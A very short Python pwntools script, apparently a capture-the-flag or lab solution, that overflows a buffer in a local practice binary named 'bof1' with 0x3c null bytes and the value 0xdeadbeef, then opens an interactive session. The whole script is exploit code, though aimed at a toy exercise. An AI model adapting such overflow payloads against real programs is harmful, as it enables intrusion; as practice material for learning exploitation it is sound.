from pwn import*

p = process("./bof1")

payload = b"\x00"*0x3c + p64(0xdeadbeef)

p.sendline(payload)
p.interactive()
